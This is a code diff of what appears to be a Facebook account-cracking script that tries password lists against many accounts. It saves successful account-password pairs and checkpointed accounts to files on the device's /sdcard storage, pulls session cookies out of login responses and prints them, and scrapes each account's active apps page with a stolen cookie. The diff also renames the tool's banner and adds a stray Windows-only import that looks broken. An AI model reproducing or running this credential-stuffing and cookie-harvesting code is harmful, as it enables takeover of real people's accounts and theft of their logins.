@@ -1,3 +1,5 @@
+ ####@-----Import-----@####
+from msilib.schema import AppSearch
 import os,base64
 
 os.system('git pull -q;rm .rndm')
@@ -192,7 +194,7 @@ def file():
    
 ####@-----AppCheck-----@####
 def check(session,coki):
-    w=session.get("'https://graph.facebook.com/me?fields=id,name&access_token='",cookies={"cookie":coki}).text
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -337,18 +339,19 @@ def method():
                 print('\r\033[1;92m[\033[1;97mCENT-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                 open('/sdcard/CENT-OK.txt','a').write(f'{acc} • {pword}\n')
                 if c=='y':
-                    try:
-                           q = json.loads(response.text)
-                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                           cookies = f"sb={ssbb};{ckkk}"
-                    except Exception as e:print(str(e)+' | '+response.text)
-                break
-            elif 'www.mfacebook.com' in response.text:
+                 try:  
+                  q = json.loads(response.text)
+                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                  cookies = f"sb={ssbb};{ckkk}"
+                 except Exception as e:print(str(e)+' | '+response.text)
+                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
+                 break
+            elif 'checkpoint' in response.text:
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mCENT-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'  ')
+                     print('\r\033[1;91m[\033[1;97mCENT-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                 cpacc.append(acc)
                 open('/sdcard/CENT-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
@@ -518,7 +521,7 @@ def andom():
         except:
             last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r\033[1;91m[\033[1;97mCENT-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:
             heads = None
